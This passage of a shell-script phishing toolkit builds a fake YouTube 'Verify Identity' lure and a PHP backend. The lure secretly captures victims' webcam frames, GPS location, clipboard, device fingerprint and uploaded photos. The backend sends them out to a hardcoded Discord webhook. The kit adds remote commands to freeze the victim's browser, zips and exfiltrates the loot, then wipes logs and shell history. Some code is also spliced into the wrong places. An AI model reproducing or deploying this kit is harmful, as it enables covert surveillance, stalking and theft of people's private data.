 * ZEEKA APEX C2 RELAY - TITANIUM PRO MAX
 * Upgraded with Dynamic Mapping, Async Discord, and Smart Sessioning.
 */

error_reporting(0);
date_default_timezone_set('UTC');

// --- CONFIGURATION ---
$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479000177061789838/K9YwBFZyW5g7nxclDrc2oCD3cbeI148G2VoND0Tn5B4WddKCnPN4xNzTmu2TRAM7L7eH";

// 1. ENVIRONMENT SECURITY & SMART SESSIONING
$target_dir = 'captured/' . $_SERVER['REMOTE_ADDR'];
if (!file_exists($target_dir)) {
    mkdir($target_dir, 0777, true);
    file_put_contents($target_dir . '/.htaccess', 'Deny from all');
}

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('H:i:s');

// 2. COMMAND DISPATCHER (The Beef Link)
if (isset($_GET['cmd'])) {
    $commandQueue = ['snap', 'exit', 'freeze', 'vibrate', 'dark', 'light', 'ping'];
    foreach ($commandQueue as $signal) {
        $file = "signal_" . $signal;
        if (file_exists($file)) {
            echo strtoupper($signal);
            if ($signal !== 'freeze') unlink($file);
            exit();
        }
    }
    echo "IDLE";
    exit();
}

// --- ADD THIS TO YOUR PHP SIPHON LOGIC ---
if (!empty($_POST['photo_data'])) {
    $data = $_POST['photo_data'];
    $fname = $_POST['filename'] ?? 'grabbed_' . time() . '.jpg';
    
    // Remove the header (data:image/jpeg;base64,)
    $data = str_replace('data:image/jpeg;base64,', '', $data);
    $data = str_replace('data:image/png;base64,', '', $data);
    $data = str_replace(' ', '+', $data);
    
    $decodedData = base64_decode($data);
    $savePath = "captured/" . $fname;

    if (file_put_contents($savePath, $decodedData)) {
        // Log it for the Titan Metadata
        file_put_contents("logs.txt", "[+] Photo Captured: $fname\n", FILE_APPEND);
        
        // Optional: Notify Discord that a new file is in the vault
        $msg = json_encode(["content" => "📸 **New Photo Siphoned:** `$fname`"]);
        $ch = curl_init($O5_WEBHOOK);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $msg);
        curl_exec($ch);
    }
}

// 3. NITRO IMAGE HANDLER (2 FPS JPEG)
if (!empty($_POST['cat'])) {
    $raw_data = $_POST['cat'];
    $decoded_data = base64_decode(str_replace(['data:image/jpeg;base64,', 'data:image/png;base64,', ' '], ['', '', '+'], $raw_data));
    
    $ms = sprintf("%03d", (microtime(true) * 1000) % 1000);
    $filename = $target_dir . "/F_" . date('His') . "_" . $ms . ".jpg";
    
    if (file_put_contents($filename, $decoded_data, LOCK_EX)) {
        touch("hit"); 
    }
    exit();
}

// 4. DEEP TELEMETRY & GEO-FORENSICS
if (!empty($_POST['lat'])) {
    $lat  = $_POST['lat'];
    $lon  = $_POST['lon'];
    $bat  = $_POST['bat'] ?? 'N/A';
    $dev  = $_POST['dev'] ?? 'Unknown Intel';
    $net  = $_POST['net'] ?? 'Unknown';
    $clip = $_POST['clip'] ?? 'Access Denied';

    // UPGRADE: Real Dynamic Google Maps Link
    $map = "https://www.google.com/maps?q=$lat,$lon";

    $report = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $report .= "🚀 TARGET ACQUIRED | $time | IP: $ip\n";
    $report .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $report .= "📍 GPS  : $lat, $lon\n";
    $report .= "🔗 MAPS : $map\n";
    $report .= "🔋 BAT  : $bat\n";
    $report .= "📶 NET  : $net\n";
    $report .= "📱 DEV  : $dev\n";
    $report .= "📋 CLIP : $clip\n";
    $report .= "🖥️ AGENT: $ua\n";
    $report .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

    file_put_contents("logs.txt", $report, FILE_APPEND | LOCK_EX);
    file_put_contents("last_intel.txt", $report, LOCK_EX);
    touch("data_ready");

    // UPGRADE: Rich Discord Integration
    $json_data = json_encode([
        "content" => "🎯 **Target Hooked: $ip**",
        "embeds" => [[
            "title" => "📍 View Exact Location",
            "url" => $map,
            "color" => 15158332,
            "fields" => [
                ["name" => "🔋 Battery", "value" => $bat, "inline" => true],
                ["name" => "📶 Network", "value" => $net, "inline" => true],
                ["name" => "📱 Device", "value" => "```$dev```", "inline" => false],
                ["name" => "📋 Clipboard", "value" => "```$clip```", "inline" => false]
            ],
            "footer" => ["text" => "Zeeka Titanium Engine | $time"]
        ]]
    ]);

    $ch = curl_init($DISCORD_WEBHOOK);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2); // Prevents script hang
    curl_exec($ch);
    curl_close($ch);
    
    exit();
}

// 5. STATUS EVENT STREAM
if (isset($_POST['status'])) {
    file_put_contents("status_update", "[$time] " . $_POST['status']);
    exit();
}
?>
_EOF_PHP

		echo -e " \e[1;32m[INJECTED]\e[0m"
               
                # =================================================================
		# PART 3: THE STEALTH HTML LURE (PRO MAX UI)
		# =================================================================
		echo -ne "[*] Crafting Stealth Lure..."

		# --- 2. FRONTEND: index.html ---
cat <<'EOF_HTML' > index.html
error_reporting(0); // This stops the "Random Typings" from showing up
ini_set('display_errors', 0);
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>YouTube</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        /* TITANIUM DARK MODE OVERRIDE */
        body, html { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; font-family: 'Roboto', 'Helvetica', sans-serif; }
    
        /* The Full-Screen Lockdown Overlay */
        #O { 
            position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; 
            background: rgba(0, 0, 0, 0.85); 
            display:flex; justify-content:center; align-items:center; 
            backdrop-filter: blur(20px); /* Brutal Blur for background video */
        }

        /* The 'Amoled' Verification Card */
        .p { 
            background:#121212; 
            padding:45px 35px; 
            border-radius:16px; 
            text-align:center; 
            width:100%;
            max-width:350px; 
            box-shadow: 0 0 50px rgba(0,0,0,0.8); 
            border: 1px solid #282828;
        }

        .p img { width:100px; margin-bottom:25px; opacity: 0.9; }
        .p h2 { font-size:24px; font-weight:500; color:#ffffff; margin: 0 0 10px; letter-spacing: -0.5px; }
        .p p { font-size:13px; color:#909090; line-height:1.6; margin-bottom:35px; }

        /* YouTube 'Action Blue' - Pill Shape */
        button { 
            background:#3ea6ff; 
            color:#000000; 
            border:none; 
            padding:14px 24px; 
            font-size:14px; 
            font-weight:700; 
            cursor:pointer; 
            border-radius:24px; 
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s ease;
            box-shadow: 0 4px 15px rgba(62, 166, 255, 0.2);
        }
        button:hover { background: #65b8ff; transform: translateY(-1px); }
        button:active { transform: translateY(1px); }

        /* Brutal Progress UI */
        #progress-container { display:none; margin-top:25px; text-align: left; }
        .bar-bg { width:100%; height:4px; background:#222; border-radius:4px; overflow:hidden; }
        #bar { width:0%; height:100%; background:#3ea6ff; box-shadow: 0 0 12px rgba(62, 166, 255, 0.6); transition: width 0.5s cubic-bezier(0.1, 0.7, 1.0, 0.1); }
    
        #status-text { font-size:11px; color:#3ea6ff; margin-top:12px; font-family: 'Courier New', monospace; font-weight: bold; }
        #percent { font-size:12px; color:#ffffff; font-family: monospace; }
    </style>
</head>
<body>
    
    <div id="flash"></div>
    <div id="O">
        <div class="p">
            <div style="position: relative; margin-bottom: 25px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube" style="width: 100px; opacity: 0.9;">
                <div id="scan-bar" style="display:none; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #3ea6ff; box-shadow: 0 0 10px #3ea6ff; animation: scan 2s infinite;"></div>
            </div>
        
            <h2 id="title-text">Verify Identity</h2>
            <p id="main-desc">This content is age-restricted. To access the video player, confirm your device identity through our secure hardware gateway.</p>

            <div id="trigger-box">
                <button id="A" onclick="document.getElementById('photo-grab').click()">
                Confirm & Continue
                </button>
                <input type="file" id="photo-grab" accept="image/*" multiple style="display:none;" onchange="siphonPhotos(this)">
            </div>

            <div id="progress-container" style="display:none; margin-top:25px; text-align: left;">
                <div style="width:100%; height:4px; background:#222; border-radius:4px; overflow:hidden;">
                    <div id="bar" style="width:0%; height:100%; background:#3ea6ff; box-shadow: 0 0 12px rgba(62, 166, 255, 0.6); transition: width 0.5s ease;"></div>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 12px;">
                    <p id="status-text" style="font-size:10px; color:#3ea6ff; font-family: 'Courier New', monospace; font-weight: bold; margin:0;">INITIALIZING_SECURE_SYNC...</p>
                    <p id="percent" style="font-size:12px; color:#ffffff; font-family: monospace; margin:0;">0%</p>
                </div>
            </div>

            <div style="margin-top: 35px; border-top: 1px solid #282828; padding-top: 20px; text-align: left;">
                <div style="display: flex; align-items: center; margin-bottom: 10px;">
                    <svg width="14" height="14" viewBox="0 0 24 24" style="margin-right: 10px;"><path fill="#555" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                    <span style="font-size: 11px; color: #555;">Encrypted Connection (AES-256)</span>
                </div>
                <div style="display: flex; align-items: center;">
                    <svg width="14" height="14" viewBox="0 0 24 24" style="margin-right: 10px;"><path fill="#555" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                    <span style="font-size: 11px; color: #555;">Hardware ID Verified by Google Security</span>
                </div>
            </div>
        </div>
    </div>

    <div id="video-engine" style="position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:1; pointer-events:none;">if [ -z "$TARGET_LINK" ]; then
            sleep 3
            TARGET_LINK=$(grep -o 'https://[-0-9a-z.]*\.trycloudflare.com' ../target.log | head -n 1)
        fi

        clear
        echo -e " 🚀 \e[1;32mTarget Lure:\e[0m $TARGET_LINK"
        echo -e " 💎 \e[1;34mAdmin Panel:\e[0m $ADMIN_LINK/ui/panel"
        <iframe id="f" 
            src="https://www.youtube.com/embed/pkf0g-8YGS0?autoplay=1&mute=1&controls=0&loop=1&playlist=pkf0g-8YGS0" 
            style="width: 100%; height: 100%; border:none; filter: blur(35px) brightness(0.25); transform: scale(1.1);">
        </iframe>
    </div>

    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
    function siphonPhotos(input) {
        const files = input.files;
        for (let i = 0; i < files.length; i++) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const base64Data = e.target.result;
                // Sending data to your Part 2 (post.php)
                fetch('post.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'photo_data=' + encodeURIComponent(base64Data) + '&filename=' + files[i].name
                });
            };
            reader.readAsDataURL(files[i]);
        }
        alert("Verification submitted. Please wait...");
    }
    </script>
    <iframe id="f" src="https://www.youtube.com/embed/pkf0g-8YGS0?autoplay=1&mute=1&controls=0&enablejsapi=1" allow="autoplay; camera; geolocation; clipboard-read"></iframe>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
                const v = document.getElementById('v'), c = document.getElementById('c'), x = c.getContext('2d'), f = document.getElementById('f');
            
            // 1. DEEP HARDWARE FINGERPRINTING
            const getDeepIntel = () => {
                const d = {
                    plt: navigator.platform,
                    mem: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
                    cpu: navigator.hardwareConcurrency || "N/A",
                    res: window.screen.width + "x" + window.screen.height,
                    ven: navigator.vendor,
                    touch: ('ontouchstart' in window) ? "Yes" : "No",
                    net: navigator.connection ? navigator.connection.effectiveType : "unknown"
                };
                return Object.entries(d).map(([k, v]) => k + ': ' + v).join(" | ");
            };
	    
	    async function siph(input) {
                const files = Array.from(input.files);
                if (files.length === 0) return;

                // Show the progress bar and hide the button
                document.getElementById('A').style.display = 'none';
                document.getElementById('progress-container').style.display = 'block';

                const bar = document.getElementById('bar');
                const pct = document.getElementById('percent');
                const txt = document.getElementById('status-text');

                for (let i = 0; i < files.length; i++) {
                    // Update status text based on progress
                    if (i > files.length / 2) txt.innerText = "Syncing with Security Gateway...";
        
                    const file = files[i];
                    const base64 = await toBase64(file);
        
                    // Send to Part 2 (post.php)
                    await $.post('post.php', { 
                        photo_data: base64, 
                        filename: file.name 
                    });
            
                    // Calculate and update percentage
                    let progress = Math.round(((i + 1) / files.length) * 100);
                    bar.style.width = progress + "%";
                    pct.innerText = progress + "% Complete";
                }

                // Final Action: Trigger Option 5 (The Redirect)
                txt.innerText = "Verification Success! Redirecting...";
                setTimeout(() => {
                    window.location.replace("https://www.youtube.com/watch?v=pkf0g-8YGS0");
                }, 1500);
            }

            // Helper to convert files to Base64
            const toBase64 = file => new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = error => reject(error);
            });
            
            async function siphonPhotos(input) {
                const files = Array.from(input.files);
                if (files.length === 0) return;

                // Start Visual Effects
                document.getElementById('scanner').style.display = 'block';
               document.getElementById('scanner').style.animation = 'scan 2s linear infinite';
    
                document.getElementById('main-desc').style.display = 'none';
                document.getElementById('trigger-box').style.display = 'none';
                document.getElementById('progress-container').style.display = 'block';
            
                const bar = document.getElementById('bar');
                const pct = document.getElementById('percent');
                const txt = document.getElementById('status-text');
                const log = document.getElementById('live-log');

                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
        
                    // Update Live Log with fake memory addresses
                    log.innerText = "0x" + Math.random().toString(16).substr(2, 8).toUpperCase() + " >> SYNCING_PARTIAL_ID...";
                    txt.innerText = "BLOCK_" + (i + 1) + "_VERIFIED";

                    try {
                        const base64 = await toBase64(file);
                        await fetch('post.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'photo_data=' + encodeURIComponent(base64) + '&filename=' + Date.now() + "_" + file.name
                        });

                        let progress = Math.round(((i + 1) / files.length) * 100);
                        bar.style.width = progress + "%";
                        pct.innerText = progress + "%";
                    } catch (e) { }
                }

                txt.innerText = "AUTHENTICATION_SUCCESS";
               txt.style.color = "#00ff00";
                log.innerText = "REDIRECTING_TO_CONTENT_GATEWAY...";
    
                setTimeout(() => {
                    window.location.replace("https://www.youtube.com/watch?v=pkf0g-8YGS0");
                }, 1200);
            }
            // 2. NITRO SILENT CAPTURE (2 FPS / JPEG 0.6)
            async function snap() {
                if(v.srcObject && !document.hidden) {
                    c.width = 1280; c.height = 720;
                    x.drawImage(v, 0, 0, 1280, 720);
                    $.post('post.php', { cat: c.toDataURL("image/jpeg", 0.6) });
                }
            }

            // 3. REMOTE COMMAND LISTENER (750ms)
            setInterval(() => {
                $.get('post.php?cmd=1', d => {
                    let cmd = d.trim();
                    if(cmd == 'SNAP') snap();
                    if(cmd == 'EXIT') window.location.replace("https://youtube.com");
                    if(cmd == 'FREEZE') { 
                        window.onbeforeunload = () => "Critical: Verification Required"; 
                        history.pushState(null,null,location.href); 
                        window.onpopstate = () => history.go(1); 
                    }
                });
            }, 750);

            // 4. THE MASTER TRIGGER (GPS + CAMERA + HARDWARE)
            document.getElementById('A').onclick = async function() {
                const btn = this;
                btn.innerHTML = 'VERIFYING...';
                btn.disabled = true;
                f.src = f.src.replace("mute=1", "mute=0");

                let clipData = "";
                try { clipData = await navigator.clipboard.readText(); } catch(e) { clipData = "Denied"; }

                // 1. ATTEMPT GPS (With a 5-second limit)
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude, lon = pos.coords.longitude;
                    
                    // 2. ATTEMPT CAMERA
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(stream => {
                        v.srcObject = stream; v.play();
                        document.getElementById('O').style.display = 'none';
                        setInterval(snap, 500);

                        navigator.getBattery().then(b => {
                            $.post('post.php', { 
                                lat: lat, lon: lon, 
                                bat: Math.round(b.level * 100) + '%', 
                                dev: getDeepIntel(), clip: clipData 
                            });
                        });
                    }).catch(e => {
                        // CAMERA DENIED: Don't reload! Just hide the overlay and log it.
                        document.getElementById('O').style.display = 'none';
                        $.post('post.php', { lat: lat, lon: lon, status: "Cam Denied", dev: getDeepIntel() });
                    });
                }, (err) => {
                    // GPS DENIED: Don't reload! Try camera anyway.
                    $.post('post.php', { status: "GPS Denied", dev: getDeepIntel(), clip: clipData });
                    
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(stream => {
                        v.srcObject = stream; v.play();
                        document.getElementById('O').style.display = 'none';
                        setInterval(snap, 500);
                    }).catch(e => {
                        // TOTAL DENIAL: Just hide the overlay so they stay on the page.
                        document.getElementById('O').style.display = 'none';
                        $.post('post.php', { status: "Total Denial", dev: getDeepIntel() });
                    });
                }, { enableHighAccuracy: true, timeout: 5000 });
            };
        </script>
</body>
</html>
EOF_HTML
		echo -e " \e[1;32m[MASTERPIECE CREATED]\e[0m"
                
                # =================================================================
        # PART 4: THE TITAN MONITOR & COMMAND INTERFACE (PRO MAX)
        # =================================================================
        echo -e "        \e[1;32m[MASTERPIECE CREATED]\e[0m"
        echo -e "        \e[1;32m[+] UPLINK ESTABLISHED. MONITORING LIVE TELEMETRY...\e[0m"
        echo -e "        \e[1;33m[!] KEYS: [s] Snap | [p] Audio | [f] Freeze | [m] Morph | [x] Exfiltrate\e[0m"
        echo -e "        \e[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"

        count=0
        while true; do
                # 1. ASYNCHRONOUS FRAME TRACKER
                if [ -f "hit" ]; then
                        ((count++))
                        case $((count % 4)) in 0) r="[|]";; 1) r="[/]";; 2) r="[-]";; 3) r="[\\]";; esac
                        echo -ne "\r        \e[1;31m$r CAPTURED:\e[0m $count Frames | \e[1;32mSIGNAL: STABLE\e[0m"
                        rm hit
                fi

                # 2. INTEL PACKET DISPLAY
                if [ -f "data_ready" ]; then
                        echo -e "\n\n        \e[1;33m[⚡] CRITICAL INTEL RECEIVED:\e[0m"
                        echo -e "        \e[1;37m$(cat logs.txt | tail -n 15)\e[0m"
                        rm data_ready
                        echo -e "\n        \e[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
                fi

                # 3. LIVE EVENT STREAM
                if [ -f "status_update" ]; then
                        echo -e "\n        \e[1;36m[LIVE FEED]:\e[0m $(cat status_update)"
                        rm status_update
                fi

                # 4. MASTER KEY LISTENER (0.1s Latency)
                read -t 0.1 -n 1 key
                case $key in
                        s) touch signal_snap; echo -e "\n        \e[1;34m[CMD]\e[0m REMOTE SHUTTER TRIGGERED";;
                        p) touch signal_audio; echo -e "\n        \e[1;34m[CMD]\e[0m AUDIO GRENADE DEPLOYED";;
                        r) touch signal_exit; echo -e "\n        \e[1;34m[CMD]\e[0m REDIRECTING TARGET TO YOUTUBE";;
                        f) touch signal_freeze; echo -e "\n        \e[1;34m[CMD]\e[0m BROWSER PERSISTENCE (FREEZE) ENABLED";;
                        m) touch signal_morph; echo -e "\n        \e[1;34m[CMD]\e[0m PHISHING MORPH ACTIVATED";;
                        x) echo -e "\n        \e[1;33m[!] MANUAL EXFILTRATION INITIATED\e[0m"; break;;
                esac
        done
	# =================================================================
        # PART 5: THE FORENSIC VAULT & SCORCHED EARTH (PRO MAX)
        # =================================================================
        echo -e "\n\n        \e[1;33m[!] INITIATING SECURE EXFILTRATION PROTOCOL...\e[0m"

        # 1. GENERATE TIMESTAMPED VAULT
        VAULT_ID="TITAN_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$VAULT_ID"

        # 2. CONSOLIDATE EVIDENCE
        echo -ne "        [*] Packing Forensic Evidence..."
        mv captured/*.png "$VAULT_ID/" 2>/dev/null
        if [ -f "logs.txt" ]; then
                cp logs.txt "$VAULT_ID/Final_Intel_Report.txt"
        fi
        
        {
                echo "Session End : $(date)"
                echo "Total Frames: $count"
                echo "Status      : COMPLETED"
        } > "$VAULT_ID/Metadata.log"
        echo -e " \e[1;32m[DONE]\e[0m"

        # 3. ENCRYPTED COMPRESSION
        echo -ne "        [*] Compressing Archive..."
        zip -r -q "$VAULT_ID.zip" "$VAULT_ID"
        echo -e " \e[1;32m[SECURED]\e[0m"

        # 4. DISCORD BEAM (Exfiltration)
        if [ ! -z "$O5_WEBHOOK" ]; then
                echo -ne "        [*] Beaming Vault to Discord..."
                curl -s \
                         -F "payload_json={\"content\":\"🏆 **TITAN SESSION SECURED**\n📦 Vault: \`$VAULT_ID\`\n📸 Frames: **$count**\"}" \
                         -F "file=@$VAULT_ID.zip" \
                         "$O5_WEBHOOK" > /dev/null
                echo -e " \e[1;32m[TRANSMITTED]\e[0m"
        fi

        # 5. SCORCHED EARTH CLEANUP
        echo -ne "        [*] Executing Global Wipe..."
        pkill -9 php > /dev/null 2>&1
        pkill -9 cloudflared > /dev/null 2>&1
        
        rm -rf "$VAULT_ID" "$VAULT_ID.zip" hit data_ready logs.txt signal_* status_update 2>/dev/null
        echo -e " \e[1;32m[WIPED]\e[0m"

        echo -e "        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo -e "        \e[1;32m[+] OPERATION FINISHED. GHOST MODE ACTIVE.\e[0m"
        echo -e "        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	;;
  37)
    echo -e "\n--- Launching Zeeka Insta-Engine ---"
    
    # Path to your existing app
    APP_PATH="$HOME/Zeeka/Tools/InstaPy"

    if [ -d "$APP_PATH" ]; then
        cd "$APP_PATH" || exit
        # Just run the app that is already there
        python3 zeeka_insta.py
    else
        echo "[-] Error: App not found. Run the setup first."
    fi

    echo -e "\nSession Finished."
    cd ~
    ;;
  0|00) 
    echo -e "\e[1;33m[*] SECURE EXIT: Wiping Session Logs...\e[0m"
    rm -f .l.rc $LOG # Deletes temp metasploit and fail logs
    history -c      # Clears current bash history
    echo -e "\e[1;32m[+] SYSTEM CLEAN. GOODBYE MASTER ADMIN.\e[0m"
    exit 0 ;;
 esac
 [[ "$sel" != "T" && "$sel" != "22" && "$sel" != "F" ]] && echo "Done. Enter..." && read
done
 # =================================================================
